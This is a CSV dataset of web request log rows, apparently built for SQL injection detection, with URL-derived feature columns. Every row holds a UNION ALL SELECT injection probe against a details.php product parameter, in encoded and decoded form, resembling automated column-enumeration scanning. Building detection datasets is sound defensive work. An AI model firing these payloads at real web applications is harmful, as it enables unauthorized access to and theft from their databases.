full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x65766d6c7650734b6c664167464a4877485676514d44764b6263576f6e617459426156636862474a%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT CONCAT(0x7176787171,0x65766d6c7650734b6c664167464a4877485676514d44764b6263576f6e617459426156636862474a,0x7178706a71),NULL,NULL,NULL,NULL-- -&type=2",1680093085.005559,10.0.2.31,4,160,1.9,1,3.125
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x4e63674c434b586141725757746574736f5a434f61575345686d424e4f4d487144426641444a6145%2C0x7178706a71%29%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787171,0x4e63674c434b586141725757746574736f5a434f61575345686d424e4f4d487144426641444a6145,0x7178706a71),NULL-- -&type=2",1680093085.013564,10.0.2.31,4,160,1.9,1,3.125
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176787171%2C0x4c53626451794f7056504d6243526c5a63624f66777244524f794b666d6a435358677a6a4e624f61%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,CONCAT(0x7176787171,0x4c53626451794f7056504d6243526c5a63624f66777244524f794b666d6a435358677a6a4e624f61,0x7178706a71),NULL,NULL,NULL-- -&type=2",1680093085.018106,10.0.2.31,4,160,1.9,1,3.125
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x47467a78564b796f716e62477a5142685066646b4268546479586b75534d53705875614a4f4b4650%2C0x7178706a71%29--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176787171,0x47467a78564b796f716e62477a5142685066646b4268546479586b75534d53705875614a4f4b4650,0x7178706a71)-- -&type=2",1680093085.023116,10.0.2.31,4,160,1.9,1,3.125
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176787171%2C0x72454866616d476d6557%2C0x7178706a71%29%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787171,0x72454866616d476d6557,0x7178706a71),NULL,NULL-- -&type=2",1680093085.037734,10.0.2.31,4,100,1.9,1,5.0
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x786b4b586d4e6352676c%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT CONCAT(0x7176787171,0x786b4b586d4e6352676c,0x7178706a71),NULL,NULL,NULL,NULL-- -&type=2",1680093085.044036,10.0.2.31,4,100,1.9,1,5.0
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x68477677566157555472%2C0x7178706a71%29%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787171,0x68477677566157555472,0x7178706a71),NULL-- -&type=2",1680093085.048062,10.0.2.31,4,100,1.9,1,5.0
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176787171%2C0x696d5645467a77464966%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,CONCAT(0x7176787171,0x696d5645467a77464966,0x7178706a71),NULL,NULL,NULL-- -&type=2",1680093085.052877,10.0.2.31,4,100,1.9,1,5.0
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x7952746142697372506c%2C0x7178706a71%29--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176787171,0x7952746142697372506c,0x7178706a71)-- -&type=2",1680093085.057227,10.0.2.31,4,100,1.9,1,5.0
/details.php?prod=-4064%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x7a72765a6b50446c514c74636c5767655748475263464f437572424f78707876614f6b43786f696a%2C0x7178706a71%29%2CNULL--%20-&type=2,"/details.php?prod=-4064 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787171,0x7a72765a6b50446c514c74636c5767655748475263464f437572424f78707876614f6b43786f696a,0x7178706a71),NULL-- -&type=2",1680093085.061935,10.0.2.31,4,164,1.9,1,3.048780487804878
